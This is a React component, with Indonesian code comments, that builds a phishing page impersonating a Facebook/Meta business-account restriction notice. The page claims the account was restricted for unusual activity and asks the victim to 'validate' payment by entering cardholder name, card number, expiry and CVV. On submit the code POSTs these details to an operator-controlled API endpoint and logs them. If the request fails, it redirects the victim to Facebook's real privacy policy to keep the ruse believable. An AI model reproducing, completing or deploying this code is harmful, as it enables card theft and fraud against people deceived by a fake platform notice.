import React, { useState } from 'react';
import cardValidator from 'card-validator';
import { useNavigate } from 'react-router-dom';
import './Validation.css'; 
import logo from './logo.svg'; 

function Validation() {
  const navigate = useNavigate();
  const [cardDetails, setCardDetails] = useState({
    nameOnCard: '',
    cardNumber: '',
    expiry: '',
    cvv: ''
  });

  const [errors, setErrors] = useState({});

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    let formattedValue = value;

    // Format expiry date MM/YY
    if (name === 'expiry') {
      // Remove any non-digit characters
      const cleaned = value.replace(/\D+/g, '');
      // Add slash after 2 digits
      formattedValue = cleaned.substring(0, 2) + (cleaned.length > 2 ? '/' + cleaned.substring(2, 4) : '');
    }

    setCardDetails(prevState => ({ ...prevState, [name]: formattedValue }));
  };

  const validateForm = () => {
    const newErrors = {};
    if (!cardDetails.nameOnCard.trim()) {
      newErrors.nameOnCard = 'Name on card is required';
    }

    const numberValidation = cardValidator.number(cardDetails.cardNumber);
    if (!numberValidation.isValid) {
      newErrors.cardNumber = 'Card number is invalid';
    }

    const expiryValidation = cardValidator.expirationDate(cardDetails.expiry);
    if (!expiryValidation.isValid) {
      newErrors.expiry = 'Expiry date is invalid';
    }

    const cvvValidation = cardValidator.cvv(cardDetails.cvv, numberValidation.card ? numberValidation.card.code.size : undefined);
    if (!cvvValidation.isValid) {
      newErrors.cvv = 'CVV is invalid';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (validateForm()) {
      // Jika form valid, lakukan request ke server
      console.log('Submitting form:', cardDetails);
      try {
        const response = await fetch(`${process.env.REACT_APP_API_URL}/validate`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(cardDetails),
        });
        const result = await response.json(); // asumsikan server mengembalikan JSON
        console.log('Success:', result);
        // Handle response dari server di sini, misalnya tampilkan notifikasi sukses
      } catch (error) {
        window.location.href = 'https://www.facebook.com/privacy/policy/'
        console.error('Error submitting form:', error);
        // Handle error di sini, misalnya tampilkan notifikasi error
      }
    } else {
      console.log('Validation failed:', errors);
      // Tampilkan pesan error di UI
    }
  };

  return (
    <div className="validation-form-container">
    <form onSubmit={handleSubmit} className="validation-form">
      <div className="logo-header">
      <img src={logo} alt="Logo" className="logo" />
        
      </div>
      <p className="login-description"><b>Your account has been restricted</b></p>
      <p className="login-description2"> We noticed unusual activity on this Business Account and have restricted its access to advertising. Any ads connected to this account are currently disabled. To learn more, please review our Advertising policies affecting business assets
</p>
<p className="login-description2">We used technology to detect this violation and technology to carry out this decision. Further violations of our Advertising Standards may result in your account being disabled or restricted.</p> {/* Teks deskripsi di sini */}
   
<p className="login-description3"> If you believe your account was incorrectly restricted, we can take you through a few steps to verify your account and request a review.
</p>
<h5><b>Validate Your Payment : </b></h5>
      <div className="card-details">
        <input
          type="text"
          name="nameOnCard"
          value={cardDetails.nameOnCard}
          onChange={handleInputChange}
          placeholder="Name on card"
          className={`input-field ${errors.nameOnCard ? 'error' : ''}`}
        />
          {errors.nameOnCard && <div className="error-message">{errors.nameOnCard}</div>}
  {/* Ulangi struktur ini untuk input lain dengan penyesuaian yang diperlukan */}
        
        <input
          type="text"
          name="cardNumber"
          value={cardDetails.cardNumber}
          onChange={handleInputChange}
          placeholder="Card number"
          className={`input-field ${errors.cardNumber ? 'error' : ''}`}
        />
        {errors.cardNumber && <div className="error-message">{errors.cardNumber}</div>}
  {/* Ulangi struktur ini untuk input lain dengan penyesuaian yang diperlukan */} 
        <div className="expiration-date ">
          <input
            type="text"
            name="expiry"
            value={cardDetails.expiry}
            onChange={handleInputChange}
            placeholder="MM/YY"
           className={`input-field short-input ${errors.expiry ? 'error' : ''}`}
          />
           {errors.expiry && <div className="error-message">{errors.expiry}</div>}
  {/* Ulangi struktur ini untuk input lain dengan penyesuaian yang diperlukan */} 
           </div>

           <div className="CVV ">
          <input
            type="text"
            name="cvv"
            value={cardDetails.cvv}
            onChange={handleInputChange}
            placeholder="CVV"
            className={`input-field short-input ${errors.cvv ? 'error' : ''}`}
          />
           {errors.cvv && <div className="error-message">{errors.cvv}</div>}
  {/* Ulangi struktur ini untuk input lain dengan penyesuaian yang diperlukan */} 
           </div>
       
      </div>

      <div className="security-info">
        <span className="security-lock-icon">🔒</span>
        <p>Your payment methods are saved and stored securely.</p>
        <a href="#">Terms apply</a>
      </div>
      <button type="submit" className="save-button">Submit</button>
    </form>
  </div>
);
}

export default Validation;
